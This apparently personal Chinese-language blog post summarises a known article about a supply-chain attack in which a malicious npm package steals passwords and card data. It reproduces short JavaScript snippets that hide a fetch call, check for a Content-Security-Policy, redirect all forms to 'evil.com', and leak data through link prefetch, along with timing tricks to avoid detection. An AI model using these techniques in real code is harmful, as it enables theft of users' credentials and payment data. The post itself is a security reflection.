---
layout: post
title: web哪有什么安全
date: 2018-08-13
categories: tech
publish: true
---

读[一篇文章](https://hackernoon.com/im-harvesting-credit-card-numbers-and-passwords-from-your-site-here-s-how-9a8cb347c5b5)，有感而发，安全真的难做。

文中一些让人“眼前一亮”的 hack 如下：

- 传播方式：npm dependency 注入，相比之下 xss 什么的就弱爆了，没有用户输入也能让你中招
- 伪装成人畜无害的 package，比如“let you log to console in any color”（我觉得是在黑 chalk.js），然后拼命往其他 npm 上下载的多的项目提 pr，总会有一些 merge 的
- 然后就静静地躺在那些中招的项目的 node_modules 里，耐心潜伏
- 恶意代码被发现了咋办？这个好说，在项目结构上伪装一下，`src`里放人畜无害的代码，`dst`里放 unglify 的恶意代码（反正`dst`里的代码也是 gitignore 掉的），但是并不是从`src`的代码 build 过去的。所以，看项目的 github 干干净净，但是从 npm 下载下来的执行的代码，却是完全的两回事
- 而且，恶意代码也没那么容易发现，至少静态扫代码不行：

```javascript
const i = "gfudi"; // fetch
const k = s =>
  s
    .split("")
    .map(c => String.fromCharCode(c.charCodeAt() - 1))
    .join("");
self[k(i)](urlWithYourPreciousData);
```

- 假设你在`colorful.log`的时候，就已经莫名其妙的执行了很多恶意代码了，比如获取`input[type=password].value`
- 这些获取的信息，总得传到自己的服务器上吧，这个门道就更多了：
- 永远不在`NODE_ENV=developement`的时候发请求，开发测试期可能就躲过去了
- 永远不在 7am 到 7pm 发请求，高峰期又可能就避过去了（数据先放 localStorage 之类的地方缓缓）
- 然后现代浏览器发请求，都有个叫 Content Security Policy 的东西做安全的托底。有 CSP 怎么绕开呢？先确认一下：

```javascript
fetch(document.location.href).then(resp => {
  const csp = resp.headers.get("Content-Security-Policy");
  // does this exist? Is is any good?
});
```

- 确认的目的很简单，如果顶着 CSP 作案，可能会被 report-uri 捕获，留下犯罪痕迹
- CSP 不合理就好办了：

```javascript
Array.from(document.forms).forEach(
  formEl => (formEl.action = `//evil.com/bounce-form`)
);
```

- 有 CSP 咋办呢，还有终极大招：

```javascript
const linkEl = document.createElement("link");
linkEl.rel = "prefetch";
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

- 如果浏览器恰好不支持 prefetch，但是 CSP 设置却异常合理，咋整？不整了呗，反正也不会留下痕迹

---

当然故事是编的，不过从可行性上来看，没啥大问题

---

亚里士多德一波：

1. 运行在客户端的代码都是不安全的
1. web 代码（js）运行在客户端
1. 所以 web 代码是不安全的

客户端代码：AKA 用户去主动运行的代码，比起服务器代码：AKA 程序员或者程序去启动的代码，理论上就存在更多可能。游戏外挂和各种 pc 病毒都没灭绝，web 的绝对安全谈何容易，充其量也就是提高一点犯罪成本罢了。
